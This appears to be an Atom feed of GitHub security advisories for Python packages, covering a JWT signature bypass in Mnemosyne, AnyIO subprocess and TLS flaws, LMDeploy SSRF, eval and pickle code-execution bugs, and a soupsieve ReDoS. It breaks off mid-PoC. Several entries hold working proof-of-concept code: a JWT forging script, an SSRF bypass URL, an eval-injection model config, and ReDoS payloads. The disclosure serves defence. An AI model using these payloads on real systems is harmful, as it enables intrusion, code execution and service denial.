<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-09-18T22:01:33.128Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mnemosyne-memory] Mnemosyne has JWT signature verification bypass sync server that allows authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-xcw4-53cc-hv32</id>
        <link href="https://github.com/advisories/GHSA-xcw4-53cc-hv32"/>
        <updated>2026-09-18T17:54:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Mnemosyne sync server's authentication check decoded JWT bearer tokens but never verified their HMAC-SHA256 signatures. Any well-formed token was accepted, allowing an unauthenticated attacker to impersonate any user and read or modify their sync data.</p>
<p><strong>Severity: Critical</strong></p>
<p>CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1</p>
<p>Assumes the sync server endpoint is network-reachable. If your deployment is localhost-only, the score drops substantially and severity becomes High or Medium depending on local exposure. Confirm your threat model.</p>
<h3 id="affected-versions">Affected versions</h3>
<p>All mnemosyne versions exposing the sync server endpoint, up to and including v3.10.0.</p>
<h3 id="patched-versions">Patched versions</h3>
<p>v3.10.1 (commit a0b6b871 on branch security/jwt-signature-verification)</p>
<hr>
<h3 id="description">Description</h3>
<p>The sync server uses JWT bearer tokens to authenticate clients. Prior to v3.10.1, the auth check in mnemosyne/core/sync_server.py parsed the JWT's header and payload using base64 decoding, then passed the token to a jwt library call with options that effectively disabled signature verification. The server accepted any well-formed token regardless of the signature, including tokens with alg: none and tokens signed with the wrong key.</p>
<p>The fix in v3.10.1 replaces the broken decode with a from-scratch HS256 verifier using only the Python standard library:</p>
<ul>
<li>Constant-time signature comparison via hmac.compare_digest</li>
<li>Strict alg: HS256 check, rejecting none and other algorithms</li>
<li>UTC-aware exp validation with leeway</li>
<li>Loud errors with specific failure reasons</li>
<li>Type validation of decoded payload before use</li>
</ul>
<h3 id="impact">Impact</h3>
<p>An attacker with network access to the sync server can:</p>
<ul>
<li>Forge a JWT for any user_id without knowing the secret</li>
<li>Authenticate as that user to /sync/status, /sync/push, and /sync/pull</li>
<li>Read the victim's sync state</li>
<li>Push malicious sync state to corrupt the victim's local database</li>
<li>Pivot within a shared deployment (multi-user sync server)</li>
</ul>
<p>Confidentiality and integrity of sync data are fully compromised for the duration of exposure. There is no impact on the server's availability.</p>
<h3 id="reproduction">Reproduction</h3>
<pre><code class="language-python">import base64
import json
import requests

# Forge a JWT for any user. No secret required.
def forge_jwt(user_id):
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    ).rstrip(b"=")
    payload = base64.urlsafe_b64encode(
        json.dumps({"user_id": user_id, "exp": 9999999999}).encode()
    ).rstrip(b"=")
    sig = b""
    return f"{header.decode()}.{payload.decode()}."

r = requests.get(
    "https://target.example.com/sync/status",
    headers={"Authorization": f"Bearer {forge_jwt('victim-user-id')}"},
)
print(r.status_code, r.json())
</code></pre>
<p>A 200 OK response with valid sync status payload confirms the bypass. The attack requires no credentials, no secret, and no prior access.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Upgrade to v3.10.1.</p>
<p>For users who cannot upgrade immediately:</p>
<ul>
<li>Restrict network access to the sync server endpoint to trusted clients only. Firewall, reverse proxy with mTLS, or localhost bind with SSH tunnel are all viable.</li>
<li>The vulnerability is not exploitable against an unreachable endpoint.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>None. The patch is required to restore authentication integrity.</p>
<h3 id="credits">Credits</h3>
<ul>
<li>Reporter: Denis Hache (dplush). Reported via private channel on 2026-06-13 with full reproduction and a coordinated disclosure window.</li>
<li>Fix: Denis Hache</li>
</ul>
<h3 id="timeline">Timeline</h3>
<ul>
<li>2026-06-13: Initial report received from Denis via private channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AxDSan/mnemosyne/security/advisories/GHSA-xcw4-53cc-hv32">https://github.com/AxDSan/mnemosyne/security/advisories/GHSA-xcw4-53cc-hv32</a></li>
<li><a href="https://github.com/mnemosyne-oss/mnemosyne/pull/373">https://github.com/mnemosyne-oss/mnemosyne/pull/373</a></li>
<li><a href="https://github.com/mnemosyne-oss/mnemosyne/commit/a0b6b8711a1a485304971710dc3571e29ff9dbeb">https://github.com/mnemosyne-oss/mnemosyne/commit/a0b6b8711a1a485304971710dc3571e29ff9dbeb</a></li>
<li><a href="https://github.com/mnemosyne-oss/mnemosyne/releases/tag/v3.10.1">https://github.com/mnemosyne-oss/mnemosyne/releases/tag/v3.10.1</a></li>
<li><a href="https://github.com/advisories/GHSA-xcw4-53cc-hv32">https://github.com/advisories/GHSA-xcw4-53cc-hv32</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcw4-53cc-hv32</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-18T17:54:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[anyio] AnyIO run_process/open_process ignores extra_groups and can retain parent supplementary groups]]></title>
        <id>https://github.com/advisories/GHSA-3w57-8xmc-8v26</id>
        <link href="https://github.com/advisories/GHSA-3w57-8xmc-8v26"/>
        <updated>2026-09-18T17:17:24.000Z</updated>
        <content type="html"><![CDATA[<p>AnyIO 4.14.0 accepts the POSIX extra_groups argument on anyio.run_process() and anyio.open_process(), but open_process() forwards the wrong variable to the backend: when extra_groups is not None, it assigns kwargs["extra_groups"] = group instead of extra_groups. As a result, callers cannot reliably clear or set supplementary groups for child processes. In a disposable Linux container, Python's subprocess.run(..., extra_groups=[]) clears a synthetic parent supplementary group list, while anyio.run_process(..., extra_groups=[]) preserves the parent groups. If group is also supplied, AnyIO passes an integer as extra_groups and the call fails with TypeError. This is a POSIX privilege-dropping correctness issue for applications that rely on AnyIO subprocess helpers to launch less-privileged child processes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/agronholm/anyio/security/advisories/GHSA-3w57-8xmc-8v26">https://github.com/agronholm/anyio/security/advisories/GHSA-3w57-8xmc-8v26</a></li>
<li><a href="https://github.com/agronholm/anyio/pull/1209">https://github.com/agronholm/anyio/pull/1209</a></li>
<li><a href="https://github.com/agronholm/anyio/commit/eb562e6462ee46b1904e50b02ce00a858cdeb200">https://github.com/agronholm/anyio/commit/eb562e6462ee46b1904e50b02ce00a858cdeb200</a></li>
<li><a href="https://github.com/agronholm/anyio/releases/tag/4.14.2">https://github.com/agronholm/anyio/releases/tag/4.14.2</a></li>
<li><a href="https://github.com/advisories/GHSA-3w57-8xmc-8v26">https://github.com/advisories/GHSA-3w57-8xmc-8v26</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3w57-8xmc-8v26</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-18T17:17:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[anyio] AnyIO: TLSStream IDNA 2003 host name encoding enables potential TLS certificate spoofing]]></title>
        <id>https://github.com/advisories/GHSA-82r6-8w77-94w6</id>
        <link href="https://github.com/advisories/GHSA-82r6-8w77-94w6"/>
        <updated>2026-09-18T17:17:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Services using internationalized (non-ASCII) domain names are potentially vulnerable to TLS connections made from AnyIO's <code>connect_tcp()</code> or directly via <code>TLSStream.wrap()</code> where the connection has (through other means) been hijacked and redirected to a malicious server. The attacker would obtain a legitimate certificate using the IDNA 2003 encoded version of the domain name and offer it to the connecting client, making the certificate validate properly on the client's end.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability will be patched in v4.14.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Encode host names via the <code>idna</code> package prior to connecting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/agronholm/anyio/security/advisories/GHSA-82r6-8w77-94w6">https://github.com/agronholm/anyio/security/advisories/GHSA-82r6-8w77-94w6</a></li>
<li><a href="https://github.com/agronholm/anyio/pull/1208">https://github.com/agronholm/anyio/pull/1208</a></li>
<li><a href="https://github.com/agronholm/anyio/commit/68f58915f82d9be8109ebbbd8f5d70577d43f2ce">https://github.com/agronholm/anyio/commit/68f58915f82d9be8109ebbbd8f5d70577d43f2ce</a></li>
<li><a href="https://github.com/agronholm/anyio/releases/tag/4.14.2">https://github.com/agronholm/anyio/releases/tag/4.14.2</a></li>
<li><a href="https://github.com/advisories/GHSA-82r6-8w77-94w6">https://github.com/advisories/GHSA-82r6-8w77-94w6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82r6-8w77-94w6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-18T17:17:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[anyio] AnyIO process-pool workers can block indefinitely on undrained stderr]]></title>
        <id>https://github.com/advisories/GHSA-5p39-cfhj-2xmp</id>
        <link href="https://github.com/advisories/GHSA-5p39-cfhj-2xmp"/>
        <updated>2026-09-18T17:17:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>AnyIO starts process-pool workers with stderr connected to a pipe but never drains that pipe. The worker redirects stdin and stdout to /dev/null to protect its protocol, but does not redirect stderr even though the documentation says all three standard streams are redirected. Worker code that writes enough attacker-influenced data to stderr can fill the pipe, block before returning the stdout protocol response, and wedge the awaiting process-pool call.</p>
<p>Anyone who runs untrusted or faulty code that writes too much to <code>stderr</code> is at risk.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability will be patched in v4.14.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Closing <code>sys.stderr</code> in the target function should at least prevent the deadlock.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/agronholm/anyio/security/advisories/GHSA-5p39-cfhj-2xmp">https://github.com/agronholm/anyio/security/advisories/GHSA-5p39-cfhj-2xmp</a></li>
<li><a href="https://github.com/agronholm/anyio/pull/1207">https://github.com/agronholm/anyio/pull/1207</a></li>
<li><a href="https://github.com/agronholm/anyio/commit/f1b7301c8264b0d2e8d24a5788fd29e93dea4040">https://github.com/agronholm/anyio/commit/f1b7301c8264b0d2e8d24a5788fd29e93dea4040</a></li>
<li><a href="https://github.com/agronholm/anyio/releases/tag/4.14.2">https://github.com/agronholm/anyio/releases/tag/4.14.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5p39-cfhj-2xmp">https://github.com/advisories/GHSA-5p39-cfhj-2xmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5p39-cfhj-2xmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-18T17:17:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmdeploy] LMDeploy has an SSRF bypass]]></title>
        <id>https://github.com/advisories/GHSA-39wr-7q6h-cf68</id>
        <link href="https://github.com/advisories/GHSA-39wr-7q6h-cf68"/>
        <updated>2026-09-18T17:14:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The URL checking logic in lmdeploy has a logical flaw that could be bypassed by attackers, leading to SSRF attacks.</p>
<h3 id="details">Details</h3>
<p>The current lmdeploy project uses <code>_is_safe_url</code> to validate the input URL. The main logic is to perform security checks on the host portion of the URL extracted by urlparse to prevent SSRF attacks.
<img width="943" height="836" alt="QQ20260416-203956-16-1" src="https://github.com/user-attachments/assets/042faad1-7458-444a-bbc9-525c772b0a4d">
However, there are indeed differences in parsing between urlparse and the library that actually sends the request. Currently, almost all application scenarios in this project involve first using <code>_is_safe_url</code> for URL validation, and then using requests.Session().get to send the request.
<img width="1086" height="576" alt="QQ20260416-204053-16-2" src="https://github.com/user-attachments/assets/7ffb8a69-b155-483a-90be-016c53e6387a">
The core issue:&nbsp;<code>urlparse()</code>&nbsp;and&nbsp;<code>requests</code>&nbsp;disagree on which host a URL like&nbsp;<code>http://127.0.0.1:6666\@1.1.1.1</code>&nbsp;points to:</p>
<ul>
<li><code>urlparse()</code>&nbsp;treats&nbsp;<code>\</code>&nbsp;as a regular character and&nbsp;<code>@</code>&nbsp;as the userinfo-host delimiter, so it extracts hostname as&nbsp;1.1.1.1&nbsp;(public)</li>
<li><code>requests</code>&nbsp;treats&nbsp;<code>\</code>&nbsp;as a path character, connecting to&nbsp;<code>127.0.0.1</code>&nbsp;(internal)</li>
</ul>
<p>Below is a test code I wrote following the code.</p>
<pre><code>from urllib.parse import urlparse
import ipaddress
import socket
import requests


def _is_safe_url(url: str) -&gt; tuple[bool, str]:
    """Check if the URL is safe to fetch (not internal/private)."""
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return False, f"Unsupported scheme: {parsed.scheme}"

        hostname = parsed.hostname
        if not hostname:
            return False, "Could not parse hostname from URL"

        # check all IPs (IPv4 + IPv6) using getaddrinfo
        try:
            infos = socket.getaddrinfo(hostname, None)
        except socket.gaierror:
            return False, "Hostname resolution failed"

        for info in infos:
            ip = ipaddress.ip_address(info[4][0])
            # block any IP that is not globally routable (covers private, loopback,
            # link-local, multicast, reserved, unspecified, etc.)
            if not ip.is_global:
                return False, f"Blocked non-global IP detected: {ip}"

        return True, "URL is safe"
    except Exception as e:
        return False, f"URL validation failed: {str(e)}"


# url = "http://127.0.0.1:6666"
url = "http://127.0.0.1:6666\@1.1.1.1"
is_safe, reason = _is_safe_url(url)
if not is_safe:
    raise ValueError(f"URL is blocked for security reasons: {reason}")

fetch_timeout = 10

client = requests.Session()
client.max_redirects = 3
response = client.get(url, timeout=fetch_timeout, allow_redirects=True)
</code></pre>
<p>When an attacker uses <a href="http://127.0.0.1:6666/">http://127.0.0.1:6666/</a>, the existing detection logic can detect that this is an internal network address and block it.
<img width="1286" height="195" alt="QQ20260416-204234-16-3" src="https://github.com/user-attachments/assets/b921ff01-3b9f-49a5-a410-bd21fe42f9c9">
However, when an attacker uses <code>http://127.0.0.1:6666\@1.1.1.1</code>, the detection logic resolves the host to <code>1.1.1.1</code>, which is a public IP address, thus passing the verification. But in the actual request process, this URL is forwarded by requests.get to <code>http://127.0.0.1:6666/</code>, bypassing the detection and achieving an SSRF attack.</p>
<img width="2064" height="154" alt="QQ20260416-204319-16-4" src="https://github.com/user-attachments/assets/5da18f35-f400-46e6-9bf3-1330ba424b02">

<h3 id="poc">PoC</h3>
<pre><code>http://127.0.0.1:6666\@1.1.1.1
</code></pre>
<h3 id="impact">Impact</h3>
<p>SSRF</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/InternLM/lmdeploy/security/advisories/GHSA-39wr-7q6h-cf68">https://github.com/InternLM/lmdeploy/security/advisories/GHSA-39wr-7q6h-cf68</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/releases/tag/v0.15.0">https://github.com/InternLM/lmdeploy/releases/tag/v0.15.0</a></li>
<li><a href="https://github.com/advisories/GHSA-39wr-7q6h-cf68">https://github.com/advisories/GHSA-39wr-7q6h-cf68</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-39wr-7q6h-cf68</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-18T17:14:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmdeploy] LMDeploy vulnerable to arbitrary code execution via eval() of untrusted quant_dtype in model config loading]]></title>
        <id>https://github.com/advisories/GHSA-3hmm-rh5q-gwwr</id>
        <link href="https://github.com/advisories/GHSA-3hmm-rh5q-gwwr"/>
        <updated>2026-09-18T17:04:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>lmdeploy &lt;= latest contains a code injection vulnerability in <code>lmdeploy/pytorch/config.py</code> line 620 that allows an attacker to execute arbitrary Python code by publishing a malicious HuggingFace model with a crafted <code>quantization_config.quant_dtype</code> value. When a user loads the model with lmdeploy, the <code>quant_dtype</code> is passed to <code>eval(f'torch.{quant_dtype}')</code> without any validation.</p>
<h3 id="details">Details</h3>
<p><strong>Vulnerable code</strong> (<a href="https://github.com/InternLM/lmdeploy/blob/17ed9e5/lmdeploy/pytorch/config.py#L620">permalink</a>):</p>
<pre><code class="language-python">quant_dtype = eval(f'torch.{quant_dtype}')  # line 620
</code></pre>
<p>The <code>quant_dtype</code> value comes from the model's <code>quantization_config</code> in its HuggingFace config. When a model specifies <code>quant_method: awq</code>, the AWQ branch processes the config but does NOT override <code>quant_dtype</code>, allowing the malicious value to reach the <code>eval()</code> call.</p>
<p><strong>Attack vector:</strong> An attacker publishes a HuggingFace model with:</p>
<pre><code class="language-json">{
  "quantization_config": {
    "quant_method": "awq",
    "quant_dtype": "float16, __import__('os').system('id')"
  }
}
</code></pre>
<p>Note: The <code>_update_torch_dtype</code> method at line 53 has a whitelist check, but that's for <code>torch_dtype</code>, NOT <code>quant_dtype</code>. The <code>quant_dtype</code> at line 620 has no validation whatsoever.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">"""
PoC: eval() RCE in lmdeploy via malicious quant_dtype
Prerequisites: pip install lmdeploy
"""
import sys
from unittest.mock import MagicMock, patch

# Mock torch to capture the eval
sys.modules.setdefault('torch', MagicMock())

from lmdeploy.pytorch.config import ModelConfig

# Simulate a malicious HuggingFace model config
mock_hf_config = MagicMock()
mock_hf_config.quantization_config = {
    'quant_method': 'awq',
    'quant_dtype': "float16, __import__('os').system('id')"
}
mock_hf_config.num_attention_heads = 32
mock_hf_config.hidden_size = 4096
mock_hf_config.num_hidden_layers = 32
mock_hf_config.num_key_value_heads = 32
mock_hf_config.vocab_size = 32000

# This triggers eval(f'torch.{quant_dtype}')
# with quant_dtype = "float16, __import__('os').system('id')"
config = ModelConfig.from_hf_config(mock_hf_config, model_path='test')
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker who publishes a malicious model on HuggingFace Hub can achieve arbitrary code execution on any machine that loads the model with lmdeploy. This is a supply-chain attack vector affecting all lmdeploy users who load untrusted models.</p>
<ol>
<li>Full remote code execution when loading a malicious model</li>
<li>No user interaction beyond running <code>lmdeploy serve</code> or similar with the model</li>
<li>Affects all deployment scenarios (local, cloud, production)</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/InternLM/lmdeploy/security/advisories/GHSA-3hmm-rh5q-gwwr">https://github.com/InternLM/lmdeploy/security/advisories/GHSA-3hmm-rh5q-gwwr</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/releases/tag/v0.12.3">https://github.com/InternLM/lmdeploy/releases/tag/v0.12.3</a></li>
<li><a href="https://github.com/advisories/GHSA-3hmm-rh5q-gwwr">https://github.com/advisories/GHSA-3hmm-rh5q-gwwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3hmm-rh5q-gwwr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-18T17:04:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmdeploy] LMDeploy has Remote Code Execution by Pickle Deserialization via handle_zmq_recv in lmdeploy/lmdeploy/pytorch/disagg/conn/engine_conn.py]]></title>
        <id>https://github.com/advisories/GHSA-2vh9-42vm-xmv2</id>
        <link href="https://github.com/advisories/GHSA-2vh9-42vm-xmv2"/>
        <updated>2026-09-18T17:03:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>LMDeploy's PyTorch DistServe/PD-disaggregation control plane used
<code>recv_pyobj()</code> to deserialize messages received through a ZeroMQ PULL
socket. PyZMQ implements <code>recv_pyobj()</code> using Python pickle
deserialization, which can execute arbitrary code while reconstructing
an object.</p>
<p>The peer address used by the receiver was supplied through the
<code>POST /distserve/p2p_connect</code> HTTP endpoint. An attacker who could reach
an affected DistServe API server could cause the server to connect to an
attacker-controlled ZeroMQ endpoint and deserialize a crafted pickle
payload.</p>
<p>API-key authentication is not enabled unless the operator explicitly
configures it. As a result, affected DistServe deployments without API
keys allowed unauthenticated remote code execution with the privileges
of the LMDeploy serving process.</p>
<p>This issue affects the PyTorch backend when PD-disaggregation/DistServe
is enabled. Ordinary deployments that do not use the affected
disaggregated-serving path do not expose this data flow.</p>
<h2 id="affected-components">Affected components</h2>
<ul>
<li>HTTP entry point:
<code>lmdeploy/serve/openai/endpoints/distserve.py</code>,
<code>POST /distserve/p2p_connect</code></li>
<li>Attacker-controlled peer address:
<code>DistServeConnectionRequest.remote_engine_endpoint_info.zmq_address</code></li>
<li>Vulnerable receiver:
<code>lmdeploy/pytorch/disagg/conn/engine_conn.py</code>,
<code>EngineP2PConnection.handle_zmq_recv()</code></li>
<li>Unsafe operation: <code>recv_pyobj()</code>, which performs pickle deserialization</li>
</ul>
<h2 id="vulnerable-data-flow">Vulnerable data flow</h2>
<ol>
<li>A caller submits a DistServe P2P connection request containing a
ZeroMQ address.</li>
<li>The LMDeploy engine connects its ZeroMQ PULL socket to that address.</li>
<li><code>handle_zmq_recv()</code> receives messages using <code>recv_pyobj()</code>.</li>
<li>A malicious peer sends a crafted pickle object.</li>
<li>Python code executes during deserialization, before LMDeploy can
perform any type or field validation.</li>
</ol>
<p>  A type check performed after <code>recv_pyobj()</code> cannot mitigate this issue
  because pickle payload execution occurs during deserialization.</p>
<h2 id="impact">Impact</h2>
<p>Successful exploitation allows arbitrary code execution as the
LMDeploy serving process. This can expose model weights, prompts,
credentials, attached storage, cluster-network services, and host or
GPU resources. An attacker may also modify or terminate the serving
process.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>Affected versions:</p>
<ul>
<li><code>lmdeploy &gt;= 0.9.2, &lt; 0.16.0</code></li>
</ul>
<p>The vulnerable P2P receiver was introduced in commit <code>b0b705f7</code>.</p>
<h2 id="remediation">Remediation</h2>
<p>The issue was fixed by replacing the pickle-based ZeroMQ protocol with
JSON serialization:</p>
<ul>
<li><code>send_pyobj()</code> was replaced with <code>send_json()</code>.</li>
<li><code>recv_pyobj()</code> was replaced with <code>recv_json()</code>.</li>
<li>Received objects are validated using the
<code>DistServeCacheFreeRequest</code> Pydantic schema before use.</li>
<li>Invalid or off-schema messages are rejected without terminating the
receive loop.</li>
</ul>
<p>Fix commit:</p>
<p><a href="https://github.com/InternLM/lmdeploy/commit/f05b4ad8bf2e2d84101a1d63b3c44fadd99223b2">https://github.com/InternLM/lmdeploy/commit/f05b4ad8bf2e2d84101a1d63b3c44fadd99223b2</a></p>
<p>The fix was released in LMDeploy 0.16.0.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users who cannot upgrade immediately should:</p>
<ul>
<li>Prevent untrusted clients from reaching <code>/distserve/*</code> endpoints.</li>
<li>Restrict the DistServe HTTP and ZeroMQ control planes to trusted
cluster networks.</li>
<li>Configure API-key authentication.</li>
<li>Block arbitrary outbound ZeroMQ connections from serving nodes.</li>
</ul>
<p>These measures reduce exposure but do not make pickle deserialization
safe. Upgrading to LMDeploy 0.16.0 or later is recommended.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/InternLM/lmdeploy/security/advisories/GHSA-2vh9-42vm-xmv2">https://github.com/InternLM/lmdeploy/security/advisories/GHSA-2vh9-42vm-xmv2</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/commit/f05b4ad8bf2e2d84101a1d63b3c44fadd99223b2">https://github.com/InternLM/lmdeploy/commit/f05b4ad8bf2e2d84101a1d63b3c44fadd99223b2</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/releases/tag/v0.16.0">https://github.com/InternLM/lmdeploy/releases/tag/v0.16.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2vh9-42vm-xmv2">https://github.com/advisories/GHSA-2vh9-42vm-xmv2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2vh9-42vm-xmv2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-18T17:03:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[soupsieve] Soup Sieve: Polynomial-time ReDoS (O(n²)) in the `IDENTIFIER` / `VALUE` selector sub-patterns]]></title>
        <id>https://github.com/advisories/GHSA-gjv8-xp57-g29c</id>
        <link href="https://github.com/advisories/GHSA-gjv8-xp57-g29c"/>
        <updated>2026-09-17T20:33:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>soupsieve compiles CSS selector strings with a set of hand-written regular expressions. The shared <code>IDENTIFIER</code> sub-pattern (also embedded in <code>VALUE</code>, and therefore in attribute selectors) places two adjacent quantified groups over overlapping character classes: <code>(?:[classA]|ESC)+(?:[classB]|ESC)*</code>, where both classes match ordinary identifier characters such as <code>a</code>. When a selector contains a long identifier/value run that must ultimately fail to match (e.g. an attribute value with no closing <code>]</code>, or an identifier followed by an invalid character), the regex engine backtracks across all O(n) ways to split the run between the <code>+</code> group and the <code>*</code> group, giving O(n²) parse time. A single attacker-controlled selector of a few kilobytes stalls the interpreter for many seconds of CPU; tens of kilobytes reach minutes.</p>
<h2 id="trust-model-q0">Trust model (Q0)</h2>
<p>The selector string is the input. It reaches this code via <code>soupsieve.compile()</code>, <code>soupsieve.select/iselect/match/filter</code>, and — most commonly — BeautifulSoup's <code>soup.select(selector)</code> / <code>soup.select_one(selector)</code>, which delegate to soupsieve. This is exploitable in any application that passes a user-controlled CSS selector to BeautifulSoup/soupsieve (scrapers that accept selectors, no-code extraction tools, admin/query UIs). Applications that only use hard-coded selectors are not affected.</p>
<h2 id="root-cause-exact-anchors--srcsoupsievecss_parserpy">Root cause (exact anchors) — <code>src/soupsieve/css_parser.py</code></h2>
<pre><code class="language-python"># lines 122-126
IDENTIFIER = fr'''
(?:(?:-?(?:[^\x00-\x2f\x30-\x40\x5B-\x5E\x60\x7B-\x9f]|{CSS_ESCAPES})+|--)
(?:[^\x00-\x2c\x2e\x2f\x3A-\x40\x5B-\x5E\x60\x7B-\x9f]|{CSS_ESCAPES})*)
'''
# line 129 — VALUE embeds IDENTIFIER (so attribute values inherit the pattern)
VALUE = fr'''(?:"(?:\\(?:.|{NEWLINE})|[^\\"\r\n\f])*?"|'...'|{IDENTIFIER})'''
</code></pre>
<ul>
<li>classA <code>[^\x00-\x2f\x30-\x40\x5B-\x5E\x60\x7B-\x9f]</code> excludes digits (0x30-0x39); classB <code>[^\x00-\x2c\x2e\x2f\x3A-\x40\x5B-\x5E\x60\x7B-\x9f]</code> allows digits. The intent is "first char not a digit, remaining chars may be digits."</li>
<li>Both classes match ordinary letters (e.g. <code>a</code> = 0x61). The construct is therefore effectively <code>(?:C)+(?:C)*</code> over an overlapping class C — the canonical adjacent-quantifier shape that backtracks quadratically on a failing match.</li>
</ul>
<p>The quadratic only manifests when the overall match must fail. <code>IDENTIFIER</code> matched greedily on <code>"a"*n</code> succeeds in linear time (<del>1 ms at n=32000). Anchoring it so a following element is mandatory and fails (<code>IDENTIFIER + "$"</code> against <code>"a"*n + "!"</code>) reproduces the O(n²) directly: n=2000 → 44 ms, 4000 → 257 ms, 8000 → 743 ms, 16000 → 2944 ms (</del>×4 per ×2). Profiling <code>compile("[a=" + "a"*4000)</code> shows only 12 <code>re.match</code> calls consuming 2.685 s — i.e. the cost is inside a single regex match, confirming regex backtracking (not loop overhead).</p>
<h2 id="reproduction-environment-discipline-12--published-artifact">Reproduction environment (discipline #12 — published artifact)</h2>
<ul>
<li>git HEAD <code>751c57b</code> (2.9, <code>PYTHONPATH=src</code>): <code>cd src &amp;&amp; python3 ../poc/poc_redos_compile.py</code>.</li>
<li>Published PyPI <code>soupsieve 2.8.4</code> (fresh <code>uv pip install soupsieve beautifulsoup4</code>): <code>cd poc &amp;&amp; ../.venv-published/bin/python poc_redos_compile.py</code> → same O(n²) (evidence: <code>poc/evidence_redos_compile_PUBLISHED_2.8.4.log</code>).</li>
<li>Python 3.11.15 and 3.14.6 both reproduce.</li>
</ul>
<h2 id="poc-pocpoc_redos_compilepy">PoC (<code>poc/poc_redos_compile.py</code>)</h2>
<pre><code class="language-python">import sys, time
sys.path.insert(0, ".")
import soupsieve as sv

def compile_time(sel):
    t0 = time.perf_counter()
    try:
        sv.compile(sel)
        status = "ok"
    except Exception as e:
        status = type(e).__name__
    return (time.perf_counter() - t0), status

print(f"soupsieve {sv.__version__}\n")

print("Payload A: '[a=' + 'a'*n   (unterminated attribute value)")
for n in (1000, 2000, 4000, 8000):
    dt, st = compile_time("[a=" + "a" * n)
    print(f"  n={n:&lt;6} len={3+n:&lt;7} {dt*1000:9.1f} ms  [{st}]")

print("\nPayload B: 'a'*n + '!'   (identifier run + invalid trailing char)")
for n in (2000, 4000, 8000, 16000):
    dt, st = compile_time("a" * n + "!")
    print(f"  n={n:&lt;6} len={n+1:&lt;7} {dt*1000:9.1f} ms  [{st}]")

